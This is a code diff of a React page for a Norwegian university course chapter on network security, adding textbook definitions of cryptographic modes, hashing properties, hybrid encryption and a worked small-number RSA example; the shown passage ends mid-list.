@@ -14,7 +14,6 @@ import { SectionPager, type SectionNavItem } from "./SectionPager";
 
 type Tab = "intro" | "8.1" | "8.2" | "8.3" | "8.4" | "8.5" | "8.6" | "8.7" | "8.8" | "8.9" | "8.10";
 
-
 const SECTIONS_8: SectionNavItem[] = [
   { id: "intro", label: "Start her" },
   { id: "8.1", label: "8.1 Hva er sikkerhet?" },
@@ -36,53 +35,58 @@ export function KuroseKap8Page() {
     <div className="min-h-screen bg-background">
       <SiteHeader />
       <main className="container mx-auto px-4 py-4 max-w-6xl">
-        <header className="mb-3"><div className="flex items-center gap-2 text-xs text-muted-foreground mb-2">
-            <a href="/stack/dte-2507" className="inline-flex items-center gap-1 hover:text-foreground"><FolderOpen className="h-3 w-3" /> DTE-2507</a>
-            <span>·</span>
+        <div className="mb-3 flex items-center flex-wrap gap-x-3 gap-y-1 border-b border-border pb-1.5">
+          <div className="flex items-center gap-1.5 text-xs text-muted-foreground min-w-0">
             <a
-              href="/stack/kurose-kurs"
-              className="inline-flex items-center gap-1 hover:text-foreground"
+              href="/stack/dte-2507"
+              className="inline-flex items-center gap-1 hover:text-foreground shrink-0"
             >
-              <FolderOpen className="h-3 w-3" /> Kurose-kurset
+              <FolderOpen className="h-3 w-3" /> DTE-2507
             </a>
             <span>·</span>
-            <span>Kapittel 8 av 9</span>
-          </div><h1 className="text-2xl font-bold tracking-tight">Kap. 8 — Sikkerhet i nettverk</h1></header>
-
-        <div className="mb-4 flex flex-wrap gap-1.5 border-b border-border">
-          <TabBtn active={tab === "intro"} onClick={() => setTab("intro")}>
-            Start her
-          </TabBtn>
-          <TabBtn active={tab === "8.1"} onClick={() => setTab("8.1")}>
-            8.1 Hva er sikkerhet?
-          </TabBtn>
-          <TabBtn active={tab === "8.2"} onClick={() => setTab("8.2")}>
-            8.2 Kryptografi
-          </TabBtn>
-          <TabBtn active={tab === "8.3"} onClick={() => setTab("8.3")}>
-            8.3 Integritet
-          </TabBtn>
-          <TabBtn active={tab === "8.4"} onClick={() => setTab("8.4")}>
-            8.4 Autentisering
-          </TabBtn>
-          <TabBtn active={tab === "8.5"} onClick={() => setTab("8.5")}>
-            8.5 TLS
-          </TabBtn>
-          <TabBtn active={tab === "8.6"} onClick={() => setTab("8.6")}>
-            8.6 IPsec &amp; VPN
-          </TabBtn>
-          <TabBtn active={tab === "8.7"} onClick={() => setTab("8.7")}>
-            8.7 Brannmurer
-          </TabBtn>
-          <TabBtn active={tab === "8.8"} onClick={() => setTab("8.8")}>
-            8.8 IDS &amp; IPS
-          </TabBtn>
-          <TabBtn active={tab === "8.9"} onClick={() => setTab("8.9")}>
-            8.9 Web-angrep
-          </TabBtn>
-          <TabBtn active={tab === "8.10"} onClick={() => setTab("8.10")}>
-            8.10 Oppgaver
-          </TabBtn>
+            <a href="/stack/kurose-kurs" className="hover:text-foreground shrink-0">
+              Kurose-kurset
+            </a>
+            <span>·</span>
+            <h1 className="text-sm font-bold tracking-tight text-foreground truncate">
+              Kap. 8 — Sikkerhet i nettverk
+            </h1>
+          </div>
+          <nav className="ml-auto flex flex-wrap gap-0.5">
+            <TabBtn active={tab === "intro"} onClick={() => setTab("intro")}>
+              Start
+            </TabBtn>
+            <TabBtn active={tab === "8.1"} onClick={() => setTab("8.1")} title="Hva er sikkerhet?">
+              8.1
+            </TabBtn>
+            <TabBtn active={tab === "8.2"} onClick={() => setTab("8.2")} title="Kryptografi">
+              8.2
+            </TabBtn>
+            <TabBtn active={tab === "8.3"} onClick={() => setTab("8.3")} title="Integritet">
+              8.3
+            </TabBtn>
+            <TabBtn active={tab === "8.4"} onClick={() => setTab("8.4")} title="Autentisering">
+              8.4
+            </TabBtn>
+            <TabBtn active={tab === "8.5"} onClick={() => setTab("8.5")} title="TLS">
+              8.5
+            </TabBtn>
+            <TabBtn active={tab === "8.6"} onClick={() => setTab("8.6")} title="IPsec & VPN">
+              8.6
+            </TabBtn>
+            <TabBtn active={tab === "8.7"} onClick={() => setTab("8.7")} title="Brannmurer">
+              8.7
+            </TabBtn>
+            <TabBtn active={tab === "8.8"} onClick={() => setTab("8.8")} title="IDS & IPS">
+              8.8
+            </TabBtn>
+            <TabBtn active={tab === "8.9"} onClick={() => setTab("8.9")} title="Web-angrep">
+              8.9
+            </TabBtn>
+            <TabBtn active={tab === "8.10"} onClick={() => setTab("8.10")} title="Oppgaver">
+              Oppg.
+            </TabBtn>
+          </nav>
         </div>
 
         {tab === "intro" && <Intro onPick={setTab} />}
@@ -97,7 +101,12 @@ export function KuroseKap8Page() {
         {tab === "8.9" && <Section89 />}
         {tab === "8.10" && <Section810 />}
 
-        <SectionPager tabs={SECTIONS_8} current={tab} onPick={(id) => setTab(id as Tab)} nextChapter={NEXT_CHAPTER_8} />
+        <SectionPager
+          tabs={SECTIONS_8}
+          current={tab}
+          onPick={(id) => setTab(id as Tab)}
+          nextChapter={NEXT_CHAPTER_8}
+        />
       </main>
     </div>
   );
@@ -107,18 +116,21 @@ function TabBtn({
   children,
   active,
   onClick,
+  title,
 }: {
   children: React.ReactNode;
   active: boolean;
   onClick: () => void;
+  title?: string;
 }) {
   return (
     <button
       onClick={onClick}
-      className={`px-3 py-1.5 text-xs font-medium border-b-2 -mb-px transition-colors ${
+      title={title}
+      className={`rounded px-2 py-1 text-xs font-medium transition-colors ${
         active
-          ? "border-brand text-foreground"
-          : "border-transparent text-muted-foreground hover:text-foreground"
+          ? "bg-brand/15 text-brand"
+          : "text-muted-foreground hover:bg-muted hover:text-foreground"
       }`}
     >
       {children}
@@ -210,41 +222,76 @@ function Section81() {
 
       <div className="grid gap-3 lg:grid-cols-2">
         <Defs
-        items={[
-          {
-            term: "Konfidensialitet",
-            body: "Bare avsender og tiltenkt mottaker skal kunne lese innholdet. En passiv tjuvlytter på lenken skal ikke kunne forstå hva som sendes. Oppnås med kryptering.",
-          },
-          {
-            term: "Meldings-integritet",
-            body: "Mottakeren skal kunne stole på at innholdet ikke har blitt endret underveis — verken ved et uhell eller av en ondsinnet aktør. Selv et enkelt bit skal ikke kunne flippes uten at det oppdages. Oppnås med MAC, HMAC eller digital signering.",
-          },
-          {
-            term: "Endepunkts-autentisering",
-            body: "Begge parter skal kunne være sikre på hvem de snakker med. Når nettleseren din kobler til en bank skal den vite at det faktisk er banken — ikke en angriper som har omdirigert DNS. Oppnås typisk med digitale sertifikater og nonces.",
-          },
-          {
-            term: "Operasjonell tilgjengelighet",
-            body: "Tjenesten skal være tilgjengelig for legitime brukere. Et angrep som lammer tjenesten (DoS, DDoS) bryter dette målet selv om det ikke leser eller endrer data. Forsvares med rate-limiting, scrubbing-tjenester og overdimensjonering.",
-          },
-          {
-            term: "Trussel-modell",
-            body: "Eksplisitt liste over hva angriperen kan og ikke kan. Eks: «angriperen kan se all pakkene på lenken, men ikke kjøre kode på endepunktene». Uten en klar trussel-modell går sikkerhets-diskusjoner i ring.",
-          },
-          {
-            term: "Trudy som standard-fiende",
-            body: "Vi bruker tradisjonelt Alice og Bob som de to legitime partene som vil snakke trygt, og Trudy som angriperen. Det er bare en pedagogisk konvensjon — i praksis er angriperen alt fra et statlig etterretningsapparat til en kompromittert WiFi-ruter.",
-          },
-          {
-            term: "Defense in depth",
-            body: "Prinsipp om at man ikke skal stole på ett enkelt forsvar. Hvis brannmuren skulle feile, skal det fortsatt være kryptering, autentisering og tilgangsstyring som beskytter. Hver lag er en uavhengig barriere.",
-          },
-        ]}
-      />
+          items={[
+            {
+              term: "Konfidensialitet",
+              body: "Bare avsender og tiltenkt mottaker skal kunne lese innholdet. En passiv tjuvlytter på lenken skal ikke kunne forstå hva som sendes. Oppnås med kryptering.",
+            },
+            {
+              term: "Meldings-integritet",
+              body: "Mottakeren skal kunne stole på at innholdet ikke har blitt endret underveis — verken ved et uhell eller av en ondsinnet aktør. Selv et enkelt bit skal ikke kunne flippes uten at det oppdages. Oppnås med MAC, HMAC eller digital signering.",
+            },
+            {
+              term: "Endepunkts-autentisering",
+              body: "Begge parter skal kunne være sikre på hvem de snakker med. Når nettleseren din kobler til en bank skal den vite at det faktisk er banken — ikke en angriper som har omdirigert DNS. Oppnås typisk med digitale sertifikater og nonces.",
+            },
+            {
+              term: "Operasjonell tilgjengelighet",
+              body: "Tjenesten skal være tilgjengelig for legitime brukere. Et angrep som lammer tjenesten (DoS, DDoS) bryter dette målet selv om det ikke leser eller endrer data. Forsvares med rate-limiting, scrubbing-tjenester og overdimensjonering.",
+            },
+            {
+              term: "Trussel-modell",
+              body: "Eksplisitt liste over hva angriperen kan og ikke kan. Eks: «angriperen kan se all pakkene på lenken, men ikke kjøre kode på endepunktene». Uten en klar trussel-modell går sikkerhets-diskusjoner i ring.",
+            },
+            {
+              term: "Trudy som standard-fiende",
+              body: "Vi bruker tradisjonelt Alice og Bob som de to legitime partene som vil snakke trygt, og Trudy som angriperen. Det er bare en pedagogisk konvensjon — i praksis er angriperen alt fra et statlig etterretningsapparat til en kompromittert WiFi-ruter.",
+            },
+            {
+              term: "Defense in depth",
+              body: "Prinsipp om at man ikke skal stole på ett enkelt forsvar. Hvis brannmuren skulle feile, skal det fortsatt være kryptering, autentisering og tilgangsstyring som beskytter. Hver lag er en uavhengig barriere.",
+            },
+            {
+              term: "Ikke-avvisning (non-repudiation)",
+              body: "Mottaker kan i ettertid bevise overfor en tredjepart at avsender faktisk sendte meldingen. Symmetrisk MAC gir IKKE dette (begge har nøkkelen — hvem som helst av dem kan ha laget tag-en). Digital signering gjør det fordi bare innehaveren av den private nøkkelen kan signere.",
+            },
+            {
+              term: "Autorisasjon",
+              body: "Adskilt fra autentisering: når jeg vet hvem du er, hvilke handlinger får du lov til? Autentisering svarer «hvem», autorisasjon svarer «hva får du gjøre». En innlogget bruker kan være autentisert men ikke autorisert til å slette andre brukeres data.",
+            },
+            {
+              term: "Konfidensialitet vs personvern",
+              body: "Konfidensialitet betyr at innholdet ikke leses av uvedkommende. Personvern er bredere — det handler også om hvilke data som overhodet samles inn, hvem som ser dem internt, hvor lenge de lagres. Krypto løser konfidensialitet; personvern krever også organisatoriske og juridiske grep.",
+            },
+            {
+              term: "Konfidensialitet for metadata",
+              body: "Selv om innholdet er kryptert lekker ofte hvem som snakker med hvem, når, og hvor mye. TLS skjuler bytene men ikke at klient X koblet til server Y kl. 14:03. Tor og mixnett er forsvar mot metadata-lekkasje.",
+            },
+            {
+              term: "Passiv vs aktiv angriper",
+              body: "Passiv: kan kun lytte (sniffe trafikk). Aktiv: kan også endre, slette, sette inn eller forsinke pakker. Forsvars-mekanismer som bare beskytter mot passiv (f.eks. ren kryptering uten MAC) er ikke nok når trussel-modellen inkluderer aktiv angriper.",
+            },
+            {
+              term: "Insider-trussel",
+              body: "Angriper med legitim tilgang til deler av systemet — ansatt, leverandør, kompromittert konto. Klassiske perimeter-forsvar (brannmur) ser ikke dette. Forsvar krever minste-privilegium, logging, og separation of duties.",
+            },
+          ]}
+        />
         <Illustration caption="De fire målene som tilsammen utgjør «sikker kommunikasjon». Ingen av dem leveres gratis — hver krever sin egen mekanisme.">
-        <FourGoalsSvg />
-      </Illustration>
+          <FourGoalsSvg />
+        </Illustration>
       </div>
+
+      <Hvorfor title="Hvorfor skille mellom autentisering og integritet?">
+        <p>
+          De henger sammen — en gyldig MAC tyder på at meldingen ikke er endret OG at avsender hadde
+          nøkkelen — men de adresserer ulike trusler. Integritet handler om at innholdet er uendret;
+          autentisering handler om at avsender er den du tror. En klassisk feil er å kryptere uten å
+          autentisere: angriper kan ikke lese, men kan fortsatt flippe bit i en CTR-cipher og dermed
+          manipulere klarteksten. Derfor er det ikke nok å bare ha konfidensialitet; AEAD-modus
+          (GCM, ChaCha20-Poly1305) sørger for at begge mål dekkes i én operasjon.
+        </p>
+      </Hvorfor>
 
       <Example title="Eksempel: hvilket mål brytes?">
         <ul className="list-disc pl-5 space-y-1">
@@ -292,45 +339,110 @@ function Section82() {
 
       <div className="grid gap-3 lg:grid-cols-2">
         <Defs
-        items={[
-          {
-            term: "Symmetrisk kryptografi",
-            body: "Samme nøkkel K brukes for å kryptere og dekryptere: C = E(K, P) og P = D(K, C). Veldig raskt — moderne CPU-er kjører AES i hardware med flere GB/s gjennomstrømning. Men avsender og mottaker må allerede dele K, og det er der det vanskelige starter.",
-          },
-          {
-            term: "AES (Advanced Encryption Standard)",
-            body: "Standarden for symmetrisk krypto siden 2001. Blokk-cipher med 128-bits blokker og 128/192/256-bits nøkler. Brukes i alt fra disk-kryptering til TLS. Ingen kjente effektive angrep mot full AES med riktig nøkkellengde og driftsmodus.",
-          },
-          {
-            term: "Drifts-modus (CBC, CTR, GCM)",
-            body: "En blokk-cipher krypterer bare én fast-stor blokk om gangen. For å kryptere lengre meldinger trengs en modus. CBC kjeder blokkene med XOR; CTR bruker krypteringen som en pseudo-strøm; GCM kombinerer CTR med en MAC og er førstevalg i dag.",
-          },
-          {
-            term: "Asymmetrisk kryptografi",
-            body: "Hver bruker har et nøkkel-par: en offentlig nøkkel som alle ser, og en privat nøkkel som bare hun har. Alt kryptert med offentlig nøkkel kan bare leses med tilhørende privat nøkkel. Løser nøkkel-distribusjon — men er ~1000 ganger tregere enn symmetrisk.",
-          },
-          {
-            term: "RSA",
-            body: "Klassisk asymmetrisk algoritme, basert på vanskelighetsgraden ved å faktorisere et stort tall som er produktet av to primtall. Moderne nøkkellengde er 2048 eller 3072 bit. Brukes både til kryptering og digital signering, men erstattes gradvis av ECC fordi nøkler og signaturer blir mye mindre.",
-          },
-          {
-            term: "ECC (Elliptic Curve Cryptography)",
-            body: "Asymmetrisk krypto basert på algebraen på elliptiske kurver. Gir samme sikkerhet som RSA med mye mindre nøkler — en 256-bits ECC-nøkkel tilsvarer omtrent 3072 bits RSA. Mindre nøkler betyr mindre data over linja og raskere operasjoner. Dominerer på mobil og i moderne TLS.",
-          },
-          {
-            term: "Diffie-Hellman nøkkelutveksling",
-            body: "Algoritme som lar to parter avtale en delt hemmelighet over en åpen kanal, uten å ha kommunisert på forhånd. Begge velger en privat verdi, sender en avledet offentlig verdi, og kombinerer egne private med motpartens offentlige til samme felles tall. En tjuvlytter ser bare de offentlige verdiene og kan ikke regne ut den delte hemmeligheten.",
-          },
-          {
-            term: "Hybrid-system",
-            body: "I praksis bruker man asymmetrisk krypto eller DH bare til å avtale en sesjons-nøkkel, og deretter krypteres alle data med symmetrisk AES. Du får det beste fra begge — løste nøkkel-distribusjon, samtidig som datasiden går i hardware-fart.",
-          },
-        ]}
-      />
+          items={[
+            {
+              term: "Symmetrisk kryptografi",
+              body: "Samme nøkkel K brukes for å kryptere og dekryptere: C = E(K, P) og P = D(K, C). Veldig raskt — moderne CPU-er kjører AES i hardware med flere GB/s gjennomstrømning. Men avsender og mottaker må allerede dele K, og det er der det vanskelige starter.",
+            },
+            {
+              term: "AES (Advanced Encryption Standard)",
+              body: "Standarden for symmetrisk krypto siden 2001. Blokk-cipher med 128-bits blokker og 128/192/256-bits nøkler. Brukes i alt fra disk-kryptering til TLS. Ingen kjente effektive angrep mot full AES med riktig nøkkellengde og driftsmodus.",
+            },
+            {
+              term: "Drifts-modus (CBC, CTR, GCM)",
+              body: "En blokk-cipher krypterer bare én fast-stor blokk om gangen. For å kryptere lengre meldinger trengs en modus. CBC kjeder blokkene med XOR; CTR bruker krypteringen som en pseudo-strøm; GCM kombinerer CTR med en MAC og er førstevalg i dag.",
+            },
+            {
+              term: "Asymmetrisk kryptografi",
+              body: "Hver bruker har et nøkkel-par: en offentlig nøkkel som alle ser, og en privat nøkkel som bare hun har. Alt kryptert med offentlig nøkkel kan bare leses med tilhørende privat nøkkel. Løser nøkkel-distribusjon — men er ~1000 ganger tregere enn symmetrisk.",
+            },
+            {
+              term: "RSA",
+              body: "Klassisk asymmetrisk algoritme, basert på vanskelighetsgraden ved å faktorisere et stort tall som er produktet av to primtall. Moderne nøkkellengde er 2048 eller 3072 bit. Brukes både til kryptering og digital signering, men erstattes gradvis av ECC fordi nøkler og signaturer blir mye mindre.",
+            },
+            {
+              term: "ECC (Elliptic Curve Cryptography)",
+              body: "Asymmetrisk krypto basert på algebraen på elliptiske kurver. Gir samme sikkerhet som RSA med mye mindre nøkler — en 256-bits ECC-nøkkel tilsvarer omtrent 3072 bits RSA. Mindre nøkler betyr mindre data over linja og raskere operasjoner. Dominerer på mobil og i moderne TLS.",
+            },
+            {
+              term: "Diffie-Hellman nøkkelutveksling",
+              body: "Algoritme som lar to parter avtale en delt hemmelighet over en åpen kanal, uten å ha kommunisert på forhånd. Begge velger en privat verdi, sender en avledet offentlig verdi, og kombinerer egne private med motpartens offentlige til samme felles tall. En tjuvlytter ser bare de offentlige verdiene og kan ikke regne ut den delte hemmeligheten.",
+            },
+            {
+              term: "Hybrid-system",
+              body: "I praksis bruker man asymmetrisk krypto eller DH bare til å avtale en sesjons-nøkkel, og deretter krypteres alle data med symmetrisk AES. Du får det beste fra begge — løste nøkkel-distribusjon, samtidig som datasiden går i hardware-fart.",
+            },
+            {
+              term: "Blokk-cipher vs strøm-cipher",
+              body: "Blokk-cipher (AES) krypterer faste blokker (128 bit). Strøm-cipher (ChaCha20, RC4) produserer en lang pseudo-tilfeldig nøkkelstrøm som XOR-es med klarteksten byte-for-byte. CTR-modus gjør en blokk-cipher om til en strøm-cipher i praksis.",
+            },
+            {
+              term: "ECB-modus (Electronic Codebook)",
+              body: "Naiveste blokk-cipher-modus: hver blokk krypteres uavhengig med samme nøkkel. Problem: like klartekst-blokker gir like ciphertext-blokker. Et kjent eksempel er Tux-bildet som forblir gjenkjennelig etter ECB-kryptering. Bruk ALDRI ECB for noe annet enn øvinger.",
+            },
+            {
+              term: "CBC-modus (Cipher Block Chaining)",
+              body: "Hver klartekst-blokk XOR-es med forrige ciphertext-blokk før kryptering. Første blokk XOR-es med en IV (initialization vector). Skjuler mønstre, men er sekvensiell (kan ikke parallelliseres) og krever separat MAC for integritet — feil bruk gir padding-oracle-angrep.",
+            },
+            {
+              term: "CTR-modus (Counter)",
+              body: "Krypterer en teller (IV ‖ 0, IV ‖ 1, ...) og XOR-er resultatet med klarteksten. Helt parallelliserbar — perfekt for hardware-akselerasjon. Men hvis (nøkkel, teller)-paret gjenbrukes, kan klarteksten utledes ved å XOR-e to ciphertekster.",
+            },
+            {
+              term: "GCM-modus (Galois/Counter Mode)",
+              body: "AEAD-modus: kombinerer AES-CTR for kryptering med GHASH for autentisering. Produserer både ciphertext og en autentiserings-tag i én operasjon. Førstevalg i dag — TLS 1.3 tillater nesten ingenting annet. Krever unik nonce per (nøkkel, melding) — gjenbruk er katastrofalt.",
+            },
+            {
+              term: "IV (Initialization Vector) / nonce",
+              body: "Tilfeldig eller telle-basert verdi som sendes klart sammen med ciphertext. Sørger for at samme klartekst kryptert to ganger med samme nøkkel gir forskjellig ciphertext. CBC krever uforutsigbar IV; CTR og GCM krever bare at nonce er unik for nøkkelen.",
+            },
+            {
+              term: "AEAD (Authenticated Encryption with Associated Data)",
+              body: "Modus som gir konfidensialitet OG integritet i én primitiv. «Associated data» (f.eks. en pakke-header) blir autentisert men ikke kryptert. GCM, ChaCha20-Poly1305 og AES-OCB er AEAD. Eliminerer hele klasser av implementasjons-feil som rammer separat-kryptering-og-MAC-konstruksjoner.",
+            },
+            {
+              term: "Padding og PKCS#7",
+              body: "Blokk-ciphere krever input i hele blokker. PKCS#7 fyller på de N manglende bytene med verdien N (eks: trenger 3 byte → tre byte 0x03). Dekryptering må sjekke padding. Hvis denne sjekken lekker via tids- eller feilmeldinger får man et padding-oracle-angrep som lar angriper dekryptere uten nøkkel.",
+            },
+            {
+              term: "Nøkkellengde og 2^N",
+              body: "En 128-bits AES-nøkkel betyr 2^128 mulige nøkler. Brute-force er praktisk umulig — selv om hele jordens datakraft brukte resten av solens levetid på det. Asymmetriske algoritmer krever lengre nøkler (RSA 2048+, ECC 256+) fordi de bygger på matematiske strukturer med smartere angrep enn brute-force.",
+            },
+            {
+              term: "ChaCha20-Poly1305",
+              body: "Alternativ AEAD til AES-GCM. Strøm-cipher (ChaCha20) + MAC (Poly1305). Konstant-tids implementasjon i programvare uten AES-hardware — derfor foretrukket på mobil med dårlig AES-NI-støtte. Brukes også av Google QUIC og WireGuard.",
+            },
+            {
+              term: "Kerckhoffs' prinsipp",
+              body: "Sikkerheten skal hvile på nøkkelens hemmelighet, ikke på algoritmens. Hemmelige algoritmer (security through obscurity) brytes erfaringsmessig så fort de blir analysert. Åpne algoritmer som har overlevd mange års offentlig kryptoanalyse er mye tryggere.",
+            },
+            {
+              term: "Post-kvante-kryptografi",
+              body: "RSA og ECC brytes av Shor's algoritme på en stor nok kvantemaskin. NIST har derfor standardisert nye algoritmer (CRYSTALS-Kyber for KEM, Dilithium for signering) som hviler på gitter-problemer som er antatt vanskelige også for kvantemaskiner. Hybrid-deployment (ECDHE + Kyber) ruller ut nå.",
+            },
+          ]}
+        />
         <Illustration caption="Symmetrisk vs asymmetrisk flyt. Til venstre samme nøkkel begge veier; til høyre offentlig kryptering, privat dekryptering.">
-        <SymVsAsymSvg />
-      </Illustration>
+          <SymVsAsymSvg />
+        </Illustration>
       </div>
+
+      <Hvorfor title="Hvorfor brukes hybrid krypto (asymmetrisk + symmetrisk) i praksis?">
+        <p>
+          Asymmetrisk krypto løser ett vanskelig problem som symmetrisk ikke kan: hvordan dele en
+          nøkkel med noen du aldri har snakket med før, over en åpen kanal. Men prisen er stiv —
+          RSA-2048-kryptering av en kilobyte tar tusenvis av ganger lengre enn AES-kryptering av
+          samme kilobyte, fordi RSA innebærer modulær eksponentiasjon over store tall mens AES er
+          enkle bit-operasjoner som CPU-en har i hardware.
+        </p>
+        <p>
+          Hybrid-mønsteret bruker derfor hver primitiv til det den er god på: asymmetrisk krypto
+          eller DH frakter en liten symmetrisk nøkkel (typisk 32 byte) trygt fram, og deretter
+          krypteres alle de tunge dataene med AES eller ChaCha20. Du betaler asymmetri-kostnaden én
+          gang per sesjon, ikke per byte. Det er hjørnesteinen i TLS, SSH, S/MIME, Signal og
+          praktisk talt all moderne transport-sikkerhet.
+        </p>
+      </Hvorfor>
 
       <Illustration caption="Diffie-Hellman: begge mikser sin private verdi med motpartens offentlige, og ender på samme delte hemmelighet uten å sende den.">
         <DhSvg />
@@ -350,6 +462,42 @@ function Section82() {
         <p className="mt-2 text-muted-foreground">
           Dette mønsteret — «pakk inn nøkkelen med asymmetrisk, dataene med symmetrisk» — er
           hjørnesteinen i TLS, S/MIME og nesten alle praktiske krypto-protokoller.
+        </p>
+      </Example>
+
+      <Example title="Eksempel: RSA-kryptering steg for steg med små tall">
+        <p>
+          RSA hviler på at det er enkelt å multiplisere store primtall, men praktisk umulig å
+          faktorisere produktet tilbake. Vi bruker pinlig små tall her bare for å se mekanikken;
+          ekte RSA bruker 2048-bits primtall.
+        </p>
+        <ol className="list-decimal pl-5 mt-1 space-y-1">
+          <li>
+            Velg primtall p = 11, q = 17. Da er <code>n = p·q = 187</code> og
+            <code> φ(n) = (p−1)(q−1) = 160</code>.
+          </li>
+          <li>
+            Velg offentlig eksponent <code>e = 7</code> (relativt primtall til 160).
+          </li>
+          <li>
+            Regn ut privat eksponent <code>d</code> slik at <code>e·d ≡ 1 (mod 160)</code>. Med
+            utvidet Euklid gir det <code>d = 23</code>.
+          </li>
+          <li>
+            Offentlig nøkkel = <code>(n, e) = (187, 7)</code>. Privat nøkkel =
+            <code> (n, d) = (187, 23)</code>.
+          </li>
+          <li>
+            Krypter melding <code>m = 88</code>: <code>c = m^e mod n = 88^7 mod 187 = 11</code>.
+          </li>
+          <li>
+            Dekrypter: <code>m = c^d mod n = 11^23 mod 187 = 88</code>. Tilbake!
+          </li>
+        </ol>
+        <p className="mt-2 text-muted-foreground">
+          Hele sikkerheten ligger i at en angriper som ser <code>n = 187</code> og
+          <code> e = 7</code> må faktorisere 187 tilbake til 11·17 for å gjenutlede d. Med 2048-bits
+          n er den faktoriseringen utenfor rekkevidde for klassisk maskinvare.
         </p>
       </Example>
 
@@ -375,41 +523,94 @@ function Section83() {
 
       <div className="grid gap-3 lg:grid-cols-2">
         <Defs
-        items={[
-          {
-            term: "Kryptografisk hash-funksjon",
-            body: "Funksjon h(m) som tar inn en melding av vilkårlig lengde og produserer en kort, fast-størrelse fingeravtrykk. Skal være praktisk umulig å (a) finne to meldinger med samme hash, eller (b) regne ut en melding som matcher en gitt hash. SHA-256 er dagens standard.",
-          },
-          {
-            term: "Hvorfor hash alene ikke er nok",
-            body: "Hvis Alice sender (m, h(m)) til Bob over en åpen lenke, kan Trudy bytte ut hele meldingen til (m', h(m')) — hashen passer fortsatt. Hash gir bare beskyttelse mot tilfeldig endring (transmission errors), ikke mot en aktiv angriper.",
-          },
-          {
-            term: "MAC (Message Authentication Code)",
-            body: "Som en hash, men funksjonen tar inn en delt hemmelig nøkkel: t = MAC(K, m). Mottakeren regner ut samme MAC med samme K og sjekker at den matcher. Trudy uten K kan ikke generere gyldig t, så hun kan ikke forfalske meldinger. Krever at avsender og mottaker allerede deler K.",
-          },
-          {
-            term: "HMAC",
-            body: "Standard-konstruksjon for å lage en MAC ut av en hvilken som helst hash-funksjon. HMAC-SHA256 = SHA256((K ⊕ opad) || SHA256((K ⊕ ipad) || m)). Den doble hashen og de to konstantene gjør at lengde-extension-angrep mot rene hash-baserte MAC-er ikke fungerer.",
-          },
-          {
-            term: "Digital signering",
-            body: "Asymmetrisk versjon av MAC. Alice signerer m med sin private nøkkel: s = sign(privA, m). Hvem som helst med Alices offentlige nøkkel kan verifisere: verify(pubA, m, s) → ja/nei. Gir også ikke-avvisbarhet — Alice kan ikke i ettertid hevde at hun ikke signerte, siden bare hun har privA.",
-          },
-          {
-            term: "Signer hashen, ikke meldingen",
-            body: "Asymmetrisk signering er treigt, så i praksis signerer man h(m) i stedet for m. Alice sender (m, sign(privA, h(m))). Bob henter m, beregner h(m), og verifiserer signaturen mot den. Like trygt fordi hash-en er kollisjonsresistent.",
-          },
-          {
-            term: "Replay-angrep",
-            body: "Selv en gyldig signert melding kan misbrukes hvis Trudy spiller den av på nytt senere. «Overfør 100 kr fra Alice til Trudy» med Alices signatur kan sendes 1000 ganger. Forsvar: inkluder en nonce eller tidsstempel i meldingen som signeres.",
-          },
-        ]}
-      />
+          items={[
+            {
+              term: "Kryptografisk hash-funksjon",
+              body: "Funksjon h(m) som tar inn en melding av vilkårlig lengde og produserer en kort, fast-størrelse fingeravtrykk. Skal være praktisk umulig å (a) finne to meldinger med samme hash, eller (b) regne ut en melding som matcher en gitt hash. SHA-256 er dagens standard.",
+            },
+            {
+              term: "Hvorfor hash alene ikke er nok",
+              body: "Hvis Alice sender (m, h(m)) til Bob over en åpen lenke, kan Trudy bytte ut hele meldingen til (m', h(m')) — hashen passer fortsatt. Hash gir bare beskyttelse mot tilfeldig endring (transmission errors), ikke mot en aktiv angriper.",
+            },
+            {
+              term: "MAC (Message Authentication Code)",
+              body: "Som en hash, men funksjonen tar inn en delt hemmelig nøkkel: t = MAC(K, m). Mottakeren regner ut samme MAC med samme K og sjekker at den matcher. Trudy uten K kan ikke generere gyldig t, så hun kan ikke forfalske meldinger. Krever at avsender og mottaker allerede deler K.",
+            },
+            {
+              term: "HMAC",
+              body: "Standard-konstruksjon for å lage en MAC ut av en hvilken som helst hash-funksjon. HMAC-SHA256 = SHA256((K ⊕ opad) || SHA256((K ⊕ ipad) || m)). Den doble hashen og de to konstantene gjør at lengde-extension-angrep mot rene hash-baserte MAC-er ikke fungerer.",
+            },
+            {
+              term: "Digital signering",
+              body: "Asymmetrisk versjon av MAC. Alice signerer m med sin private nøkkel: s = sign(privA, m). Hvem som helst med Alices offentlige nøkkel kan verifisere: verify(pubA, m, s) → ja/nei. Gir også ikke-avvisbarhet — Alice kan ikke i ettertid hevde at hun ikke signerte, siden bare hun har privA.",
+            },
+            {
+              term: "Signer hashen, ikke meldingen",
+              body: "Asymmetrisk signering er treigt, så i praksis signerer man h(m) i stedet for m. Alice sender (m, sign(privA, h(m))). Bob henter m, beregner h(m), og verifiserer signaturen mot den. Like trygt fordi hash-en er kollisjonsresistent.",
+            },
+            {
+              term: "Replay-angrep",
+              body: "Selv en gyldig signert melding kan misbrukes hvis Trudy spiller den av på nytt senere. «Overfør 100 kr fra Alice til Trudy» med Alices signatur kan sendes 1000 ganger. Forsvar: inkluder en nonce eller tidsstempel i meldingen som signeres.",
+            },
+            {
+              term: "Preimage-resistens",
+              body: "Gitt en hash y skal det være praktisk umulig å finne en m som hasher til y (h(m) = y). Hvis dette brytes kan en angriper «invertere» hashen — alvorlig for passord-lagring der h(passord) er det som lagres.",
+            },
+            {
+              term: "Second-preimage-resistens",
+              body: "Gitt en konkret melding m1 skal det være praktisk umulig å finne en annen m2 ≠ m1 med h(m1) = h(m2). Hvis dette brytes kan angriperen lage en alternativ kontrakt som har samme hash som den signerte original-kontrakten.",
+            },
+            {
+              term: "Kollisjons-resistens",
+              body: "Det skal være praktisk umulig å finne et hvilket som helst par (m1, m2) med h(m1) = h(m2). Lavere bar enn second-preimage fordi angriperen får velge begge — derfor er denne grensen 2^(n/2) («fødselsdag-paradokset») i stedet for 2^n. SHA-1 ble pensjonert da praktiske kollisjoner ble vist.",
+            },
+            {
+              term: "SHA-2 og SHA-3 familier",
+              body: "SHA-2 (SHA-256, SHA-384, SHA-512) er Merkle-Damgård-konstruksjoner basert på Davies-Meyer. SHA-3 (Keccak) er en svamp-konstruksjon valgt etter åpen NIST-konkurranse, designet for å være matematisk uavhengig av SHA-2 i tilfelle den ene skulle brytes.",
+            },
+            {
+              term: "MD5 og SHA-1 — pensjonert",
